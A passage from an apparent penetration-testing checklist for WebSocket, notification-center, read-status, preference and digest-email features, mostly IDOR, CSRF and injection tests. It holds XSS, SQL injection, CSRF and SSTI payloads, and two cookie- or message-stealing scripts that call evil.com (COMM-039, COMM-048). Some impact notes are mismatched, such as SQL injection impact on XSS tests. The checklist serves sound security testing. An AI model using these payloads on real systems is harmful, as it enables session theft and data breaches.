**Test Category:** Authentication (WSTG-ATHN-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Real-time Updates (WebSocket)

**Test Steps:** 1. Capture the WebSocket connection upgrade request. 2. Remove authentication tokens or cookies. 3. Establish WebSocket connection without authentication. 4. Check if real-time updates are received without valid credentials.

**Expected Result:** Application must authenticate WebSocket connections during the handshake and reject unauthenticated upgrade requests.

**Payload Example:**

```
Connect to ws://target.com/ws/notifications without session cookie or token;try wss:// without auth headers
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite;wscat;OWASP ZAP

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## COMM-037 — WebSocket IDOR on Channel Subscription
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Real-time Updates (WebSocket)

**Test Steps:** 1. Connect to WebSocket and subscribe to own notification channel. 2. Change the channel_id or user_id in the subscription message to another user. 3. Check if updates meant for other users are received.

**Expected Result:** Application must validate that the authenticated user can only subscribe to their own channels and reject cross-user subscriptions.

**Payload Example:**

```
Send {"subscribe":"user_channel_1002"} or {"channel":"notifications_1002"} while authenticated as user 1001
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;wscat;Custom Scripts

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COMM-038 — WebSocket Message Injection
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Real-time Updates (WebSocket)

**Test Steps:** 1. Connect to WebSocket. 2. Send crafted messages with injection payloads. 3. Check if injected messages are broadcast to other users or processed by the server. 4. Test for command injection in message handlers.

**Expected Result:** Application must validate and sanitize all incoming WebSocket messages and enforce authorization before processing or broadcasting.

**Payload Example:**

```
Send {"type":"broadcast",message:"<script>alert(1)</script>"} or {"type":"admin_command",cmd:"restart"}
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;wscat;Custom Scripts

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## COMM-039 — WebSocket Cross-Site WebSocket Hijacking (CSWSH)
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** Critical · **CVSS:** 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** Real-time Updates (WebSocket)

**Test Steps:** 1. Create a malicious page that establishes a WebSocket connection to the target using the victim's cookies. 2. Lure the victim to visit the malicious page. 3. Check if the WebSocket connection is established with the victim's session. 4. Monitor for data received.

**Expected Result:** Application must validate the Origin header during WebSocket handshake and implement CSRF protection for WebSocket connections.

**Payload Example:**

```
<script>var ws=new WebSocket('wss://target.com/ws/notifications');ws.onmessage=function(e){fetch('https://evil.com/steal?data='+e.data)}</script>
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Custom HTML;Browser;Burp Suite

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## COMM-040 — WebSocket Denial of Service via Message Flooding
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Real-time Updates (WebSocket)

**Test Steps:** 1. Establish a WebSocket connection. 2. Send thousands of messages in rapid succession. 3. Send extremely large messages. 4. Open many concurrent WebSocket connections. 5. Monitor server performance.

**Expected Result:** Application must implement message rate limiting and maximum message size and connection limits per user on WebSocket endpoints.

**Payload Example:**

```
Send 10000 messages per second via ws;send single message of 100MB;open 1000 concurrent WebSocket connections
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** wscat;Custom Scripts;JMeter

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## COMM-041 — WebSocket Protocol Downgrade Attack
**Test Category:** Security Misconfiguration (WSTG-CONF-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Real-time Updates (WebSocket)

**Test Steps:** 1. Attempt to connect via ws:// instead of wss://. 2. Check if the server accepts unencrypted WebSocket connections. 3. Sniff the traffic for sensitive data.

**Expected Result:** Application must enforce wss:// (WebSocket Secure) connections and reject plain ws:// connections in production environments.

**Payload Example:**

```
Connect to ws://target.com/ws/notifications instead of wss:// and check if connection is accepted
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** wscat;Wireshark;Burp Suite

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## COMM-042 — WebSocket SQL Injection via Message Parameters
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Real-time Updates (WebSocket)

**Test Steps:** 1. Send WebSocket messages containing SQL injection payloads in message parameters. 2. Use parameters that may trigger database queries such as search or filter. 3. Monitor for SQL errors or data extraction.

**Expected Result:** Application must use parameterized queries for all database operations triggered by WebSocket messages.

**Payload Example:**

```
Send {"action":"search",query:"' OR 1=1--"} or {"filter":"test' UNION SELECT password FROM users--"} via WebSocket
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;wscat;Custom Scripts

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## COMM-043 — WebSocket Session Fixation
**Test Category:** Session Management (WSTG-SESS-03) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Real-time Updates (WebSocket)

**Test Steps:** 1. Establish a WebSocket connection and capture the session or connection token. 2. Share this token with another client. 3. Check if the second client can hijack the WebSocket session. 4. Verify session isolation.

**Expected Result:** Application must bind WebSocket sessions to authenticated users and prevent session sharing or fixation attacks.

**Payload Example:**

```
Share ws_session_token or connection_id between two different clients and check if both receive same user's updates
```

**Impact:** Session fixation/hijack -&gt; attacker rides the victim's authenticated session.

**Tools:** Burp Suite;wscat;Custom Scripts

**References:** CWE-384; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Session management

---

## COMM-044 — Sensitive Data Exposure in WebSocket Messages
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Real-time Updates (WebSocket)

**Test Steps:** 1. Monitor all WebSocket messages received. 2. Check for sensitive data like personal information or payment details or internal system data. 3. Verify data minimization.

**Expected Result:** WebSocket messages must contain only the minimum necessary data and must not transmit sensitive information in plain text.

**Payload Example:**

```
Monitor WebSocket messages for full_name;email;address;card_number;internal_ids;debug_data in message payloads
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;wscat;Browser DevTools

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## COMM-045 — WebSocket XSS via Real-time Message Display
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Real-time Updates (WebSocket)

**Test Steps:** 1. Send a WebSocket message containing XSS payload. 2. Check if the message is displayed to other connected users in real-time. 3. Verify if the payload executes in the recipient's browser.

**Expected Result:** Application must sanitize and encode all WebSocket message content before rendering in the DOM.

**Payload Example:**

```
Send {"message":"<img src=x onerror=alert(document.cookie)>"} via WebSocket and check if XSS fires on recipient's browser
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;wscat;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## COMM-046 — IDOR on Notification Center Access
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Notification Center

**Test Steps:** 1. Access own notification center. 2. Intercept the API request. 3. Change user_id or account_id to another user. 4. Check if another user's notification center data is returned.

**Expected Result:** Application must verify that the authenticated user can only access their own notification center.

**Payload Example:**

```
GET /api/notification-center?user_id=1002 with User A credentials;GET /api/users/1002/notifications
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COMM-047 — Notification Center Pagination Data Leakage
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Notification Center

**Test Steps:** 1. Access notification center with pagination. 2. Set page_size to an extremely large number. 3. Check if notifications from other users leak through pagination. 4. Verify offset boundary handling.

**Expected Result:** Application must enforce maximum page sizes and ensure pagination only returns the authenticated user's notifications.

**Payload Example:**

```
GET /api/notifications?page=1&limit=999999;GET /api/notifications?offset=-1&limit=100000
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## COMM-048 — Stored XSS in Notification Center Display
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Notification Center

**Test Steps:** 1. Trigger notifications with XSS payloads in source data like product names or usernames or messages. 2. View the notification center. 3. Check if stored XSS executes when notifications are rendered.

**Expected Result:** Application must encode all dynamic content in notification center rendering to prevent stored cross-site scripting.

**Payload Example:**

```
Create product with name=<svg/onload=alert(1)>;update username to <script>fetch('https://evil.com/'+document.cookie)</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## COMM-049 — Notification Center CSRF for Bulk Actions
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Notification Center

**Test Steps:** 1. Craft a malicious page that auto-submits requests to mark all notifications as read or delete all notifications. 2. Lure victim to visit. 3. Check if CSRF protection exists on bulk actions.

**Expected Result:** Application must validate CSRF tokens on all notification center actions including bulk mark-as-read and bulk delete.

**Payload Example:**

```
<form action='https://target.com/api/notifications/mark-all-read' method='POST'></form><script>document.forms[0].submit()</script>
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## COMM-050 — Notification Center Search SQL Injection
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Notification Center

**Test Steps:** 1. Use the notification center search functionality. 2. Inject SQL payloads in the search query. 3. Observe the response for SQL errors or data extraction.

**Expected Result:** Application must use parameterized queries for all notification search operations.

**Payload Example:**

```
GET /api/notifications/search?q=' OR 1=1--;GET /api/notifications?search=test' UNION SELECT email FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## COMM-051 — Unauthorized Notification Dismissal
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Notification Center

**Test Steps:** 1. Dismiss a notification from own center. 2. Intercept request and change notification_id to another user's notification. 3. Check if the other user's notification is dismissed.

**Expected Result:** Application must verify notification ownership before allowing dismissal or any modification.

**Payload Example:**

```
POST /api/notifications/NOTIF-2001/dismiss with User A credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COMM-052 — Notification Center Cache Poisoning
**Test Category:** Caching (WSTG-ATHN-06) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Notification Center

**Test Steps:** 1. Access notification center and check caching headers. 2. Attempt to poison the cache with malicious content. 3. Check if other users receive the poisoned cached notifications.

**Expected Result:** Application must not cache user-specific notification data in shared caches and must use proper cache-control headers.

**Payload Example:**

```
Add X-Forwarded-Host: evil.com header;check Cache-Control headers for missing no-store directive on notification responses
```

**Impact:** Web cache poisoning/deception -&gt; mass XSS/redirect or private-data disclosure.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-524; -&gt;[Web Cache Poisoning checklist](#/checklist/webcache); James Kettle Web Cache Poisoning/Deception

---

## COMM-053 — IDOR on Read/Unread Status Modification
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Read / Unread Status

**Test Steps:** 1. Mark a notification as read. 2. Intercept the request and change notification_id to another user's notification. 3. Check if the other user's notification status is changed.

**Expected Result:** Application must verify that the authenticated user owns the notification before allowing status changes.

**Payload Example:**

```
PUT /api/notifications/NOTIF-2001/read with User A credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COMM-054 — Bulk Status Manipulation Without Authorization
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Read / Unread Status

**Test Steps:** 1. Send a bulk mark-as-read request. 2. Include notification IDs from other users in the array. 3. Check if cross-user status modification occurs.

**Expected Result:** Application must validate ownership of every notification in bulk status update operations.

**Payload Example:**

```
POST /api/notifications/bulk-read with ids=[NOTIF-1001;NOTIF-2001;NOTIF-3001] including other users' notifications
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COMM-055 — Race Condition on Read Status Toggle
**Test Category:** Business Logic (WSTG-BUSL-08) · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Read / Unread Status

**Test Steps:** 1. Send concurrent requests to toggle read/unread status on the same notification. 2. Check for inconsistent state. 3. Verify data integrity after concurrent operations.

**Expected Result:** Application must handle concurrent read status updates atomically to prevent inconsistent states.

**Payload Example:**

```
Send 20 concurrent PUT /api/notifications/NOTIF-1001/toggle-read requests simultaneously
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder;Burp Suite

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## COMM-056 — Status Change Without Authentication
**Test Category:** Authentication (WSTG-ATHN-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Read / Unread Status

**Test Steps:** 1. Capture a read status change request. 2. Remove authentication tokens. 3. Replay the request without authentication. 4. Check if the status change is processed.

**Expected Result:** Application must require valid authentication for all read/unread status modification endpoints.

**Payload Example:**

```
Remove Authorization header from PUT /api/notifications/NOTIF-1001/read
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite;Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## COMM-057 — Read Receipt Information Disclosure
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Read / Unread Status

**Test Steps:** 1. If read receipts are visible check if read timestamp and device information are exposed. 2. Verify if one user can see when another user read a notification. 3. Check for excessive metadata.

**Expected Result:** Application must not expose detailed read receipt information to unauthorized users and minimize metadata in status responses.

**Payload Example:**

```
Check response for read_at_timestamp;device_info;ip_address;user_agent in read status API response
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## COMM-058 — IDOR on Notification Preference Modification
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Notification Preferences

**Test Steps:** 1. Update own notification preferences. 2. Intercept the request and change user_id to another user. 3. Check if the other user's notification preferences are modified.

**Expected Result:** Application must validate that preference updates apply only to the authenticated user's account.

**Payload Example:**

```
PUT /api/notification-preferences with user_id=1002 while authenticated as user 1001
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COMM-059 — CSRF on Notification Preference Change
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Notification Preferences

**Test Steps:** 1. Craft a malicious page that disables all notification preferences for the victim. 2. Lure authenticated victim to visit. 3. Check if preferences are changed without victim's explicit consent.

**Expected Result:** Application must validate CSRF tokens on all notification preference change requests.

**Payload Example:**

```
<form action='https://target.com/api/notification-preferences' method='POST'><input name='email_enabled' value='false'><input name='sms_enabled' value='false'><input name='push_enabled' value='false'></form><script>document.forms[0].submit()</script>
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## COMM-060 — Preference Injection for Unauthorized Channels
**Test Category:** Input Validation (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Notification Preferences

**Test Steps:** 1. Update notification preferences. 2. Add unexpected preference channels like admin_alerts or system_notifications. 3. Check if subscribing to privileged notification channels is possible.

**Expected Result:** Application must validate preference values against allowed channels and reject unauthorized channel subscriptions.

**Payload Example:**

```
Add notification_channels=["email";"sms";"admin_alerts";"system_debug";"internal_monitoring"] to preference update
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite;Postman

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## COMM-061 — Mass Assignment on Preference Object
**Test Category:** Mass Assignment (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Notification Preferences

**Test Steps:** 1. Update notification preferences. 2. Add hidden parameters like is_admin=true or override_global=true or bypass_unsubscribe=true. 3. Check if unauthorized fields are accepted.

**Expected Result:** Application must whitelist allowed preference fields and ignore any unexpected parameters.

**Payload Example:**

```
Add is_admin=true&override_global_settings=true&receive_all_internal=true to preference update body
```

**Impact:** Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover.

**Tools:** Burp Suite;Postman

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA

---

## COMM-062 — Preference Storage XSS
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Notification Preferences

**Test Steps:** 1. Update notification preferences with XSS payload in custom label or channel name fields. 2. View preferences page. 3. Check if the payload executes.

**Expected Result:** Application must sanitize all preference data on input and encode on output.

**Payload Example:**

```
custom_channel_name=<script>alert(document.cookie)</script>;label=<img src=x onerror=alert(1)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## COMM-063 — Preference Reset Without Re-authentication
**Test Category:** Authentication (WSTG-ATHN-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Notification Preferences

**Test Steps:** 1. Reset all notification preferences to defaults. 2. Check if re-authentication or confirmation is required. 3. Try resetting via CSRF or without proper session validation.

**Expected Result:** Application must require re-authentication or explicit confirmation for bulk preference resets to prevent accidental or malicious changes.

**Payload Example:**

```
POST /api/notification-preferences/reset without additional authentication challenge
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite;Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## COMM-064 — SQL Injection in Preference Filters
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Notification Preferences

**Test Steps:** 1. If preferences have search or filter capabilities inject SQL payloads. 2. Observe responses for SQL errors or data leakage.

**Expected Result:** Application must use parameterized queries for all preference-related database operations.

**Payload Example:**

```
GET /api/notification-preferences?channel=' OR 1=1--;GET /api/preferences?type=email' UNION SELECT password FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## COMM-065 — Email Preference Change Without Verification
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Notification Preferences

**Test Steps:** 1. Change notification email address in preferences. 2. Check if the new email is used without verification. 3. Verify if sensitive notifications are sent to unverified email.

**Expected Result:** Application must verify new notification email addresses before activating them for sensitive communications.

**Payload Example:**

```
Change notification_email to attacker@evil.com without email verification step
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## COMM-066 — Digest Email IDOR
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Digest Emails (Daily/Weekly)

**Test Steps:** 1. Trigger a digest email for own account. 2. Intercept and change user_id to another user. 3. Check if another user's digest is generated or sent to the attacker.

**Expected Result:** Application must generate digest emails only for the authenticated user and verify ownership before processing.

**Payload Example:**

```
POST /api/digest/generate with user_id=1002 while authenticated as user 1001
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COMM-067 — Digest Email Content Injection
**Test Category:** Injection (WSTG-INPV-03) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Digest Emails (Daily/Weekly)

**Test Steps:** 1. Add items or activities with XSS or HTML payloads that will appear in digest emails. 2. Wait for or trigger the digest email. 3. Check if payloads render in the email.

**Expected Result:** Application must sanitize all aggregated content before including in digest email templates.

**Payload Example:**

```
Create activities with names like <script>alert(1)</script> or <a href='https://evil.com'>Click here</a> that appear in digest
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Email Client;XSS Hunter

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## COMM-068 — Digest Frequency Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Digest Emails (Daily/Weekly)

**Test Steps:** 1. Set digest frequency to weekly. 2. Intercept the request and change frequency to every_minute or realtime. 3. Check if the application sends excessive digest emails.

**Expected Result:** Application must validate digest frequency against allowed values and enforce server-side rate controls.

**Payload Example:**

```
Change digest_frequency=weekly to digest_frequency=every_minute or digest_interval=1
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## COMM-069 — SSTI in Digest Email Template
**Test Category:** Injection (WSTG-INPV-18) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Digest Emails (Daily/Weekly)

**Test Steps:** 1. Enter template syntax in data fields that aggregate into digest emails. 2. Trigger digest generation. 3. Check if template engine evaluates the injected expressions in the digest email.

**Expected Result:** Application must escape all template syntax in aggregated data before inserting into digest email templates.

**Payload Example:**

```
Create item with name={{config}} or description=${7*7} and check digest email for template evaluation
```

**Impact:** Server-side template injection -&gt; remote code execution on the app server.

**Tools:** Burp Suite;Tplmap;Email Client

**References:** CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); PortSwigger SSTI (James Kettle)

---

## COMM-070 — Digest Email Timing Attack for User Enumeration
**Test Category:** Information Disclosure (WSTG-INFO-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Digest Emails (Daily/Weekly)

**Test Steps:** 1. Trigger digest generation for existing and non-existing accounts. 2. Compare response times. 3. Check if timing differences reveal account existence.

**Expected Result:** Application must ensure consistent processing times regardless of account existence to prevent enumeration.

**Payload Example:**

```
POST /api/digest/send?email=existing@test.com vs email=nonexistent@test.com timing comparison
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## COMM-071 — Digest Unsubscribe Link Manipulation
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Digest Emails (Daily/Weekly)

**Test Steps:** 1. Use the unsubscribe link in a digest email. 2. Modify user parameters in the URL. 3. Check if other users can be unsubscribed from digests.

**Expected Result:** Application must use cryptographically signed unsubscribe tokens tied to specific users.

**Payload Example:**

```
Change /digest/unsubscribe?uid=1001&token=abc to uid=1002&token=abc
```

